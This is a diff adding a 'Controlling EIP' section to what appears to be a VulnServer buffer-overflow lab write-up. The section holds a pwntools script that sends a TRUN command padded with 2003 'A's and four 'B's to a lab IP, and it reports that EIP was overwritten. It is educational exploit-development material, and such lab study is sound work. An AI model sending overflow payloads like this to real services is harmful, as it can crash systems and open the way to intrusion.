@@ -34,4 +34,22 @@ Then we can find the exact offset using pattern_offset
 [*] Exact match at offset 2003
 ```
 
+Controlling EIP 
+
+```
+from pwn import *
+
+shellcode='A'*2003 + 'B'*4
+s = remote('192.168.1.38', 9999)
+if s.connected():
+    s.send('TRUN /.:/' + shellcode)
+    s.close()
+else:
+    print("Error connecting to server")
+    sys.exit()
+
+```
+
+Our EIP was 424242 which is B
+![image](https://github.com/hac01/VulnServer/assets/70646122/29ef093c-34fe-4e45-9432-51855b596e1a)
 
